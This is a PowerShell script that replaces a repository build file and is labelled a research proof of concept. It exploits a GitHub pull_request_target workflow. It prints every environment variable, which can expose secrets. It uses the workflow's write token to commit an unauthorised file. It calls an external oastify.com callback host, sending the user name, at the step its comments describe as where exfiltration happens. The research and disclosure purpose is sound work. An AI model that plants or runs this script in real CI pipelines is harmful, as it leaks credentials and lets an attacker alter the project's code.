# .script/kqlFuncYaml2Arm.ps1
Write-Host "--- Research Proof of Concept ---"

# 1. Demonstrate access to the environment (Read-only proof)
# This shows we can see all environment variables, including potentially sensitive ones.
Get-ChildItem Env: | Out-String | Write-Host

# 2. Demonstrate Repo Modification (Write-access proof)
# Since pull_request_target provides a write token, we can modify the repo directly.
"This repo was modified by the PR script" | Out-File -FilePath "VULNERABILITY_PROOF.txt"
git add VULNERABILITY_PROOF.txt
git commit -m "PoC: Unauthorized file creation"

# 3. Demonstrate Network Connectivity
# In a real attack, this is where exfiltration happens. 
# For research, you can just ping your own test listener.
Invoke-WebRequest -Uri "https://2vyetmbe7l0qsuxbq6ntm1zwrnxel49t.oastify.com/log?user=$env:USER"
